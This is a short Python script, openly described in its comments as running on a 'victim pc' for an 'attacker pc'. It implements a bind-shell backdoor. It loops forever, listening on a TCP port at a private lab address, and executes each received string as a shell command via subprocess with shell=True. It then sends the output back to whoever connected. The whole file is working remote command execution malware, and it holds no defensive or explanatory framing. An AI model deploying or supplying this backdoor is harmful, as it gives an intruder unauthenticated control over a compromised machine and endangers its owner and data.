#Imports required for this file
import socket
import subprocess

HOST = "192.168.56.105"
PORT = 1024

#Main loop staying true whilst victim pc is on
while True:
	#Creates a socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	#Sets socket to host info
	s.bind((HOST, PORT))
	#Starts listening and waiting for commands
	s.listen(0)

	#Saves connection data when a connection is made
	conn, addr = s.accept()

	#Saves data from connection
	data = conn.recv(1024)

	#Runs command from connection in a separate shell, saving the output
	command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,)
	stdoutValue, stderrValue = command.communicate()

	#Checks whether the output is as expected, an error or non-existant
	if stdoutValue:
		output = stdoutValue
	elif stderrValue:
		output = stderrValue
	elif not stdoutValue and not stderrValue:
		output = "successfull execution but no output\n"

	#Encodes the data in case it is not correctly encoded
	if not isinstance(output, bytes):
		output = output.encode()

	#Sends result of command back to attacker pc
	conn.sendall(output)
